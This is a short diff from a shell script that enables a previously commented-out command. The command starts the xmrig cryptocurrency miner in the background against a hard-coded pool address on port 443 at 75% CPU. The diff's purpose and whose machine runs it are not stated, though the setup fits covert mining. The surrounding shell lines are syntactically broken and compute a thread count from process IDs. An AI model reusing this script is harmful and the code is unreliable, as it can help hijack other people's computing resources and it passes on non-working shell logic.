@@ -12,4 +12,4 @@ cores=(ps -ef|grep xmrig|grep -v grep|awk '{print $2}')
 printf "${cores}"
 core=(${cores})/4*3
 printf "${core}"
-#./xmrig --donate-level 1 -o 13.67.90.188:443 -u ${wkid} -k --max-cpu-usage 75 -t ${core} -B
+./xmrig --donate-level 1 -o 13.67.90.188:443 -u ${wkid} -k --max-cpu-usage 75 -t ${core} -B
